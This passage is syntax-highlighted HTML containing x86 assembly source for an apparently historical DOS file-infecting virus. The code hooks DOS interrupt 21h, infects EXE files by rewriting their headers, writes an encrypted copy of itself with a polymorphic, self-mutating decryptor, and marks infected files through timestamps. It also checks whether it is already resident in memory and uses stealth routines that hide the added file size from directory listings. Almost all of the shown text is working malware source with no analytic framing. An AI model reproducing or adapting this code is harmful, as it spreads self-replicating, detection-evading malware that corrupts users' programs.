                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_orig_int21h</span><span class="sc0">          </span><span class="sc1">; Call int 21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">file_time</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">            </span><span class="sc1">; Store Date and Time</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">file_date</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt_header</span><span class="sc0">          </span><span class="sc1">; Encrypt EXE header</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc5">sft_es</span><span class="sc0">               </span><span class="sc1">; ES:DI -&gt; SFT entry</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">sft_di</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">lenght_ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">lenght_dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Put new position in the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; SFT entry</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; Calculate new CS:IP</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">; for the infected file</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; Put new CS:IP in the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">             </span><span class="sc1">; EXE header</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; Put new "delta offset"</span><span class="sc0">
                                                </span><span class="sc1">; in the first line of</span><span class="sc0">
                                                </span><span class="sc1">; code for future</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; Put new SS</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc2">17h</span><span class="sc0">            </span><span class="sc1">; ADD ax,17h</span><span class="sc0">

                </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; Calculate marker</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; Put marker</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">inf_marker</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Get random number from</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">                  </span><span class="sc1">; our infection marker</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; Zero?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_al_increment</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                      </span><span class="sc1">; At least 1 for rotating</span><span class="sc0">
</span><span class="sc5">no_al_increment</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">first_rand</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; Store random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">second_rand</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">; bytes. In</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                          </span><span class="sc1">; first_rand_beta</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; will be stored</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">first_rand_beta</span><span class="sc4">],</span><span class="sc8">ch</span><span class="sc1">; the opposite</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">; Decide if ROR or ROL</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">do_the_ror</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">rotate_oper</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">   </span><span class="sc1">; Put ROL</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">reg8ch1</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">          </span><span class="sc1">; And use AL</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">reg8ch2</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">proceed_enc</span><span class="sc0">
</span><span class="sc5">do_the_ror</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">rotate_oper</span><span class="sc4">,</span><span class="sc2">0CCh</span><span class="sc0">   </span><span class="sc1">; Put ROR</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">reg8ch1</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">        </span><span class="sc1">; And use AH</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">reg8ch2</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">
</span><span class="sc5">proceed_enc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0Fh</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; put new SP = 0</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">44h</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc2">7dh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; ADD word ptr [si+9],7Dh</span><span class="sc0">
                                                </span><span class="sc1">; Add 7Dh to MinAlloc</span><span class="sc0">


</span><span class="sc1">; The code after this line changes the decryptor using some predefinited</span><span class="sc0">
</span><span class="sc1">; opcodes stored in a table. The various src_fill_* are the labels for</span><span class="sc0">
</span><span class="sc1">; the source bytes from which will be selected some to change the decryptor.</span><span class="sc0">
</span><span class="sc1">; The fill_poly_* are the places where foo instructions will be put.</span><span class="sc0">
</span><span class="sc1">; So DI will carry various places to fill with garbage instructions and</span><span class="sc0">
</span><span class="sc1">; SI will point on suitable instructions for that place. copy_poly_b will</span><span class="sc0">
</span><span class="sc1">; fill some place at DI with some random stuff from SI (or near SI).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">

                </span><span class="sc5">nosmart</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">enc_table_start</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">fill_poly_1</span><span class="sc0">
                </span><span class="sc5">smart</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_poly_b</span><span class="sc0">

                </span><span class="sc5">nosmart</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">fill_poly_2</span><span class="sc0">
                </span><span class="sc5">smart</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_poly_b</span><span class="sc0">

                </span><span class="sc5">nosmart</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">src_fill_3</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">fill_poly_3</span><span class="sc0">
                </span><span class="sc5">smart</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_poly_b</span><span class="sc0">

                </span><span class="sc5">nosmart</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">src_fill_4</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">fill_poly_4</span><span class="sc0">
                </span><span class="sc5">smart</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_poly_b</span><span class="sc0">

                </span><span class="sc5">nosmart</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">src_fill_5</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">fill_poly_5</span><span class="sc0">
                </span><span class="sc5">smart</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_poly_b</span><span class="sc0">

                </span><span class="sc5">nosmart</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">src_fill_6</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">fill_poly_6</span><span class="sc0">
                </span><span class="sc5">smart</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_poly_b</span><span class="sc0">

                </span><span class="sc5">nosmart</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">src_fill_7</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">fill_poly_7</span><span class="sc0">
                </span><span class="sc5">smart</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_poly_b</span><span class="sc0">

                </span><span class="sc5">nosmart</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">src_fill_8</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">fill_poly_8</span><span class="sc0">
                </span><span class="sc5">smart</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_poly_b</span><span class="sc0">

                </span><span class="sc5">nosmart</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">src_fill_9</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">fill_poly_9</span><span class="sc0">
                </span><span class="sc5">smart</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_poly_b</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

                </span><span class="sc5">nosmart</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">src_fill_10</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">fill_poly_10</span><span class="sc0">
                </span><span class="sc5">smart</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_poly_b</span><span class="sc0">

                </span><span class="sc5">nosmart</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">src_fill_11</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">fill_poly_11</span><span class="sc0">
                </span><span class="sc5">smart</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_poly_b</span><span class="sc0">

                </span><span class="sc5">nosmart</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">src_fill_12</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">fill_poly_12</span><span class="sc0">
                </span><span class="sc5">smart</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_poly_b</span><span class="sc0">

</span><span class="sc1">; End of decryptor modification</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">modify_time</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_lenght_file</span><span class="sc0">    </span><span class="sc1">; CX = bytes to write</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; Will write</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">enc_dec_copy</span><span class="sc0">            </span><span class="sc1">; Encrypt ourselves, write</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">; to a file and also of</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; course decrypt</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">lenght_ax</span><span class="sc0">            </span><span class="sc1">; Calculate new EXE file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">lenght_dx</span><span class="sc0">            </span><span class="sc1">; lenght</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">virus_lenght_file</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_page_fix</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">no_page_fix</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">               </span><span class="sc1">; Put new lenght in the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; EXE header</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek_woff</span><span class="sc0">               </span><span class="sc1">; Go at start!</span><span class="sc0">

                </span><span class="sc5">nosmart</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">exe_header_space</span><span class="sc0">
                </span><span class="sc5">smart</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_header</span><span class="sc0">            </span><span class="sc1">; Write new header</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">file_time</span><span class="sc0">            </span><span class="sc1">; Restore file_time</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0FFE0h</span><span class="sc0">               </span><span class="sc1">; Put marker for stealth</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_date</span><span class="sc0">            </span><span class="sc1">; and file_date</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_orig_int21h</span><span class="sc0">

</span><span class="sc5">int_close_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                </span><span class="sc1">; Pop flags</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">jmp_to_old_int21h</span><span class="sc0">


</span><span class="sc1">; Check if the virus is already in memory. This is checked at function</span><span class="sc0">
</span><span class="sc1">; 09h (Write a string) when the string to write is only a '$'.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">int_virus_check</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'$'</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">residency_call</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">jmp_to_old_int21h</span><span class="sc0">
</span><span class="sc5">residency_call</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">3135h</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">                </span><span class="sc1">; Interrupt return</span><span class="sc0">


</span><span class="sc1">; Int_dta_stealth is the routine that manages the stealth on Findfirst</span><span class="sc0">
</span><span class="sc1">; and Findnext (4Eh/4Fh) functions.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">int_dta_stealth</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_orig_int21h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_dta_stealth</span><span class="sc0">        </span><span class="sc1">; Jump if Error</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stealth_enabled</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_dta_stealth</span><span class="sc0">        </span><span class="sc1">; Jump if stealth disabled</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">                  </span><span class="sc1">; Get DTA</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_orig_int21h</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">16h</span><span class="sc0">                  </span><span class="sc1">; Point DI to FileTime</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">                  </span><span class="sc1">; Point SI to FileSize</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mask_time</span><span class="sc0">               </span><span class="sc1">; Check if it is infected</span><span class="sc0">
                                                </span><span class="sc1">; and stealth size if it is</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">             </span><span class="sc1">; Clear carry flag</span><span class="sc0">

</span><span class="sc5">exit_dta_stealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">; Return far</span><span class="sc0">


</span><span class="sc1">; Int_fcb_stealth manages stealth on 11h/12h</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">int_fcb_stealth</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_orig_int21h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; Was 11h/12h successful?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">exit_11_12</span><span class="sc0">              </span><span class="sc1">; If no go away</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stealth_enabled</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; Stealth enabled?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_11_12</span><span class="sc0">                      </span><span class="sc1">; No, go away</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">

